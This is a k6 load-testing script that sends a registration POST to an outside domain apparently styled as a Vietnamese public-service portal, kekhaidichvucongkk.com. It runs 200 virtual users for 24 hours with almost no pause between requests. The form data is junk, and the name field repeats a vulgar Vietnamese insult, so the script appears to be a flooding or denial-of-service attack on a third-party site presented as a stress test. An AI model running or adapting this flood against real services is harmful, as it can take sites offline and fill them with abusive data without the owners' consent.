import http from 'k6/http';
import { check, sleep } from 'k6';

export let options = {
  vus: 200,
  duration: '24h',
  thresholds: {
    http_req_duration: ['p(95)<1000'], // 95% request dưới 1s
    http_req_failed: ['rate<0.05'],    // <5% fail
  },
};

export default function () {
  const url = 'https://kekhaidichvucongkk.com/member/register';

  const payload = JSON.stringify({
    generalInfo: {
      receivingunit: 1,
      supportunit: 1,
      field: 1,
      procedure: 1,
      service: 1
    },
    applicant: {
      name: "Địt cụ mày Địt địt Địt cụ mày ...",
      birthdate: "1962-01-01",
      identitynumber: "0367221182",
      issuedate: "2021-01-01",
      issueplace: "Hà Nội",
      phone: "0987654321",
      province: "01",
      address: "Địa chỉ test stress",
      isAuthorized: true
    },
    bankInfo: {
      bank_name: "Vietcombank",
      account_number: "123456789012",
      account_name: "Nguyen Van A",
      branch: "Chi nhánh test",
      bank_province: "01",
      bank_district: "001"
    },
    landUserInfo: {
      land_user_name: "Nguyen Van A",
      land_user_address: "Địa chỉ đất test",
      land_user_phone: "0987654321",
      land_user_province: "01",
      qr_code: "QR_TEST_123",
      status: 1
    }
  });

  const params = {
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
      'check_auth': '0',
      'Authorization': 'null',
      'User-Agent': 'k6-load-test'
    },
  };

  const res = http.post(url, payload, params);

  check(res, {
    'status is 200': (r) => r.status === 200,
    'error is false': (r) => r.json('error') === false,
  });

  // Sleep ngắn để giảm áp lực client & server
  sleep(0.05 + Math.random() * 0.05);  // 50-100ms
}